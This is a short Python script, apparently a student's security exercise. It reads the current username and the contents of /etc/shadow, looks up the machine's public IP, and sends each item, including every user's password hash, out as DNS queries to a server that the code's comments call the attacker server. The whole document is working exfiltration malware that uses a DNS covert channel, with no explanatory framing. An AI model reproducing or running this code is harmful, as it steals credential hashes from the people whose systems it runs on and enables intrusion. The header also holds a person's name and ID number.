#Bar Genish 313174583
import os	 # for the current user 
import requests	 # for the passwords  
from scapy.all import * # for sending the DNS queries to the attacker server

def send_quary(str): 	#help func that create a dns queriey and send it to my dns server
	start = "www."
	end = ".com"
	tmp = start+str+end
	dns_queries = DNSQR(qname=tmp)
	send(IP(dst='10.128.10.11') / UDP(dport=53) / DNS(qd=dns_queries))
	
user = os.popen("whoami").read().strip()
passwords=os.popen("cat /etc/shadow").read().strip().split("\n") 
ipaddress = requests.get('https://checkip.amazonaws.com').text.strip()
send_quary(user)
send_quary(ipaddress)

for line in passwords:
	line=line.split(":")
	if line[0].endswith("."):
		line[0] = (line[0][:-1])
	if line[1].endswith("."):
		line[1] = (line[1][:-1])
	send_quary(line[0]+"."+line[1])